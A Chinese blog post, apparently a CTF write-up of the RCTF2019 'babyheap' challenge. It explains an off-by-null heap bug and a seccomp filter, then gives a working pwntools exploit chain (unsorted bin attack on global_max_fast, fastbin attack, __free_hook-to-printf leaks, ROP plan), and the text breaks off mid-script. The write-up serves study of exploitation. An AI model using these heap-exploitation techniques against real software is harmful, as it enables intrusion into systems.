<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/x32.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/x16.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">





  <link rel="alternate" href="/atom.xml" title="ditto's blog" type="application/atom+xml">






<meta name="description" content="pwn for fun">
<meta property="og:type" content="website">
<meta property="og:title" content="ditto&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="ditto&#39;s blog">
<meta property="og:description" content="pwn for fun">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ditto&#39;s blog">
<meta name="twitter:description" content="pwn for fun">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>ditto's blog</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ditto's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            站点地图
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/22/RCTF2019-babyheap/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ditto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/my.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ditto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/22/RCTF2019-babyheap/" itemprop="url">RCTF2019 babyheap</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-22T11:20:24+08:00">
                2019-05-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.8k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  9
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>周末做了下RCTF，还是太菜了，babyheap这道题，本来以为就是基本的NULL byte poison，然后house of orange，后来发现seccomp禁用了execve，然后就不会了，赛后看了大佬的wp才知道是unsorted bin attack修改global_max_fast,这个在ctf wiki上出现过，但是一直没有试过…戳到我的盲区了…..</p>
<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析:"></a>程序分析:</h4><p>和常规pwn题一样，保护全开，菜单题目.</p>
<h5 id="init函数"><a href="#init函数" class="headerlink" title="init函数:"></a>init函数:</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"open failed!"</span>);</span><br><span class="line">  <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">read(fd, &amp;ptrs, <span class="number">8</span>uLL);</span><br><span class="line">close(fd);</span><br><span class="line">ptrs = (void *)((unsigned int)ptrs &amp; <span class="number">0</span>xFFFF0000);</span><br><span class="line">mallopt(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( mmap(ptrs, <span class="number">0</span>x1000uLL, <span class="number">3</span>, <span class="number">34</span>, -<span class="number">1</span>, <span class="number">0</span>LL) != ptrs )</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"mmap error!"</span>);</span><br><span class="line">  <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1</span>LL, <span class="number">0</span>LL, <span class="number">0</span>LL, <span class="number">0</span>LL) )</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"Could not start seccomp:"</span>);</span><br><span class="line">  <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( prctl(<span class="number">22</span>, <span class="number">2</span>LL, &amp;filterprog) == -<span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"Could not start seccomp:"</span>);</span><br><span class="line">  <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mmap了一块随机的区域用来存放申请的堆块的信息。<br>mallopt(1, 0)禁用了fastbin，其实是将global_max_fast 这个全局变量修改为0，开始不清楚禁用fastbin的机制，就没有往修改global_max_fast上想.<br>prctl函数禁用了一些系统调用:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000004</span>  <span class="keyword">A</span> = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15 0x01</span> <span class="number">0</span>x00 <span class="number">0</span>xc000003e  if (<span class="keyword">A</span> == ARCH_X86_64) goto <span class="number">0003</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  return KILL</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x20 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  <span class="keyword">A</span> = sys_number</span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15 0x00</span> <span class="number">0</span>x01 <span class="number">0x00000029</span>  if (<span class="keyword">A</span> != socket) goto <span class="number">0006</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  return KILL</span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15 0x00</span> <span class="number">0</span>x01 <span class="number">0</span>x0000003b  if (<span class="keyword">A</span> != execve) goto <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  return KILL</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>其中禁用了execve，那就拿不到shell了，只能通过open,read,write来读取flag.</p>
<h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数:"></a>add函数:</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LODWORD(idx) = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( *((_QWORD *)ptrs + <span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)idx) &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)idx &lt;= <span class="number">15</span> )</span><br><span class="line">  LODWORD(idx) = idx + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( (_DWORD)idx == <span class="number">16</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You can't"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Size: "</span>, idx);</span><br><span class="line">size = get_int();</span><br><span class="line"><span class="keyword">if</span> ( size &lt;= <span class="number">0</span> || size &gt; <span class="number">0x1000</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid size :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)ptrs + <span class="number">4</span> * idxa + <span class="number">2</span>) = size;</span><br><span class="line">  v0 = (<span class="keyword">void</span> **)((<span class="keyword">char</span> *)ptrs + <span class="number">16</span> * idxa);</span><br><span class="line">  *v0 = <span class="built_in">calloc</span>(size, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Add success :)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最多只能申请16个chunk，申请的chunk的地址，和输入的size信息存放在mmap分配的区域中，输入的size不能超过0x1000</p>
<h5 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数:"></a>edit函数:</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">LODWORD(idx) = get_int();</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)idx &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)idx &lt;= <span class="number">15</span> &amp;&amp; *((_QWORD *)ptrs + <span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)idx) )<span class="comment">// offbyNULL </span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>, idx);</span><br><span class="line">  v1 = read_n(*((<span class="keyword">void</span> **)ptrs + <span class="number">2</span> * v0), *((_DWORD *)ptrs + <span class="number">4</span> * v0 + <span class="number">2</span>));</span><br><span class="line">  *(_BYTE *)(*((_QWORD *)ptrs + <span class="number">2</span> * v0) + v1) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Edit success :)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>存在offbyone漏洞，溢出字节为NULL.很显然，unsorted bin的poison_null_byte来造成堆块重叠.<br>show和delete函数就是常规的打印操作和free操作，且free操作没有UAF，将指针和size都清零了.</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路:"></a>利用思路:</h4><p>由于不能得到shell，只能向栈上写rop，open，read，write读取flag.</p>
<ol>
<li>首先利用<strong>poison_null_byte</strong>造成堆块重叠</li>
<li>利用堆块重叠，leak出libc.</li>
<li>利用堆块重叠造成 <strong>unsorted bin attack修改global_max_fast</strong>为&amp;main_arena+88,这样就可以使用fastbin，造成fastbin attack.</li>
<li>fastbin attack在<strong>mian_arena中写入合法的chunk_size </strong>(利用手法0ctf 2018 babyheap)</li>
<li>然后将chunk分配到main_arena，修改top chunk的地址到__free_hook附近处，一般离的很远…</li>
<li>申请到__free_hook附近的chunk，由于离的比较远，大约0x1000左右…所以需要先写入一个合法的size，然后再利用fastbin attack申请到这个chunk.</li>
<li>利用申请到的chunk，<strong>修改__free_hook为printf的地址</strong>，然后利用格式化串漏洞leak出栈地址和程序基址，再利用格式化串漏洞向栈中写入合法的chunk_size(栈中有saved rbp，可以用%lln直接写入)</li>
<li>然后将chunk分配到栈中，再在栈中写入ptr的地址（ptr中保存的有mmap分配的地址），再利用格式化串(%s)leak出mmap分配的地址.</li>
<li>得到mmap的地址后，利用fastbin attack，将chunk分配到mmap分配的区域，这样指针和size都可控了，将指针修改为栈的返回地址，然后利用edit写入ROP即可。</li>
</ol>
<p>ROP可以是用mprotect将栈可执行，然后写入shellcode，也可以直接open，read，write，由于libc中有xchg eax，edi ； ret ，直接open，read，write即可。</p>
<p>注意unsorted bin attack的时候，需要把unsorted bin中剩下的chunk一下申请完，就不会报错，会直接将整块chunk返回给你:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;  <span class="comment">//</span></span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);  <span class="comment">//unsorted bin attack，将目标修改为 &amp;main_arena+88</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">if</span> (<span class="built_in">size</span> == nb) <span class="comment">//恰好相等，直接返回</span></span><br><span class="line">   &#123;</span><br><span class="line">	  set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">      <span class="built_in">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="built_in">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="完整利用脚本"><a href="#完整利用脚本" class="headerlink" title="完整利用脚本:"></a>完整利用脚本:</h4><p>环境是ubuntu16.04 ,glibc2.23<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">local = 1</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,'-h']</span><br><span class="line">if local :</span><br><span class="line">    a=process(<span class="string">"./babyheap"</span>)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="section">else:</span></span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line">    libc=ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"./babyheap"</span>)</span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(a,'''</span><br><span class="line">b *(0x555555554000+0x000000000001103)</span><br><span class="line">b *(0x555555554000+0x000000000001327)</span><br><span class="line">b *(0x555555554000+0x000000000001240)</span><br><span class="line">               ''')</span><br><span class="line"><span class="comment">#add,delete,edit</span></span><br><span class="line">def menu(index):</span><br><span class="line">    a.recvuntil(<span class="string">"Choice: \n"</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line">def add(size):</span><br><span class="line">    menu(1)</span><br><span class="line">    a.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    a.sendline(str(size))</span><br><span class="line">def edit(index,content):</span><br><span class="line">    menu(2)</span><br><span class="line">    a.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line">    a.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    a.send(content)</span><br><span class="line">def delete(index):</span><br><span class="line">    menu(3)</span><br><span class="line">    a.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line">def show(index):</span><br><span class="line">    menu(4)</span><br><span class="line">    a.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x18)<span class="comment">#0    0</span></span><br><span class="line">add(0x910)<span class="comment">#1   0x20</span></span><br><span class="line">add(0x100)<span class="comment">#2   0x1c0</span></span><br><span class="line">add(0x10)<span class="comment">#3</span></span><br><span class="line">edit(1,'A'*0x8f0+p64(0x900)+p64(0x81))<span class="comment">#fake size</span></span><br><span class="line">delete(1)</span><br><span class="line">edit(0,'\x00'*0x18)<span class="comment">#offbyone</span></span><br><span class="line">add(0x10)<span class="comment">#1    0x20</span></span><br><span class="line">add(0x10)<span class="comment">#4     0x40</span></span><br><span class="line">add(0x8d8-0x20)<span class="comment">#5   0x60    </span></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">add(0x10)<span class="comment">#1   0x20</span></span><br><span class="line">show(4)</span><br><span class="line"></span><br><span class="line">libc_base = u64(a.recv(6).ljust(8,'\x00'))-88-libc.symbols[<span class="string">"__malloc_hook"</span>]-0x10</span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">fake_chunk=malloc_hook-0x23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x20)<span class="comment">#2</span></span><br><span class="line">edit(2,'A'*0x10+p64(0)+p64(0x8d8-0x20+8+1))</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">global_max_fast=libc_base+0x3c67f8</span><br><span class="line"></span><br><span class="line">fake_file=p64(0)+p64(0x4e1)                                 </span><br><span class="line">fake_file+='A'*8+p64(global_max_fast-0x10)    <span class="comment">#unsortedbin attack </span></span><br><span class="line"></span><br><span class="line">edit(5,fake_file)</span><br><span class="line">add(0x4d0) <span class="comment">#6    0x70</span></span><br><span class="line">edit(5,p64(0)+p64(0x71)+'A'*0x60+p64(0)+p64(0x21)+p64(0)+p64(0x21))</span><br><span class="line">delete(6)</span><br><span class="line">edit(5,p64(0)+p64(0x71)+p64(0x81))</span><br><span class="line">add(0x68) <span class="comment"># 6</span></span><br><span class="line">edit(5,p64(0)+p64(0x81))</span><br><span class="line">delete(6)</span><br><span class="line">main_arena=libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]+0x10</span><br><span class="line">fake_chunk=libc_base+0x3c4b50-0x8</span><br><span class="line">success(<span class="string">"fake_chunk_addr ==&gt; 0x%x"</span>%fake_chunk)</span><br><span class="line">edit(5,p64(0)+p64(0x81)+p64(fake_chunk))</span><br><span class="line">add(0x78)<span class="comment">#6</span></span><br><span class="line">add(0x78)<span class="comment">#7 get fake_chunk</span></span><br><span class="line"></span><br><span class="line">fake_top_chunk=0x3c5710+libc_base</span><br><span class="line">payload='\x00'*0x20+p64(fake_top_chunk)+'\x00'*(0x10-8)</span><br><span class="line">payload+=p64(libc_base+0x00007ffff7dd1b78-0x7ffff7a0d000)*2</span><br><span class="line">edit(7,payload)  <span class="comment">#恢复unsorted bin</span></span><br><span class="line"></span><br><span class="line">edit(5,p64(0)+p64(0x71)+'A'*0x60+p64(0)+p64(0x21))</span><br><span class="line">delete(6)</span><br><span class="line">edit(5,p64(0)+p64(0x71)+p64(0))<span class="comment">#恢复fastbin</span></span><br><span class="line">add(0x68)<span class="comment">#6 </span></span><br><span class="line"><span class="comment">#0x1098</span></span><br><span class="line">add(0x100)<span class="comment">#8</span></span><br><span class="line">edit(8,p64(0)+p64(0x880))</span><br><span class="line">edit(5,p64(0)+p64(0x881)+'A'*0x870+p64(0)+p64(0x21))</span><br><span class="line">delete(6)</span><br><span class="line"></span><br><span class="line">edit(5,p64(0)+p64(0x881)+p64(0x7ffff7dd2720-0x7ffff7a0d000+libc_base))</span><br><span class="line">add(0x870)<span class="comment">#6</span></span><br><span class="line">add(0x870)<span class="comment">#9 get fake_chunk</span></span><br><span class="line">edit(9,'A'*0x860+p64(0)+p64(0x880))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(5,p64(0)+p64(0x881)+'A'*0x870+p64(0)+p64(0x21))</span><br><span class="line">delete(6)</span><br><span class="line">edit(5,p64(0)+p64(0x881)+p64(0x7ffff7dd2f90-0x7ffff7a0d000+libc_base))</span><br><span class="line">add(0x870)<span class="comment">#6</span></span><br><span class="line">add(0x870)<span class="comment">#10 get fake_chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_addr=libc_base+libc.symbols[<span class="string">"printf"</span>]</span><br><span class="line">success(<span class="string">"printf_addr ==&gt; 0x%x"</span>%printf_addr)</span><br><span class="line">edit(10,'\x00'*0x808+p64(printf_addr))  <span class="comment">#修改__free_hook ==&gt; printf</span></span><br><span class="line"><span class="comment">#b *0x7ffff7a915e5</span></span><br><span class="line">edit(0,'%9$p%8$p')  <span class="comment"># 0xd74 </span></span><br><span class="line">delete(0)</span><br><span class="line">text_base=int(a.recv(14),16)-0xd74</span><br><span class="line">success(<span class="string">"text_base ==&gt; 0x%x"</span>%text_base)</span><br><span class="line">stack_addr=int(a.recv(14),16)</span><br><span class="line">success(<span class="string">"stack_addr ==&gt; 0x%x"</span>%stack_addr)</span><br><span 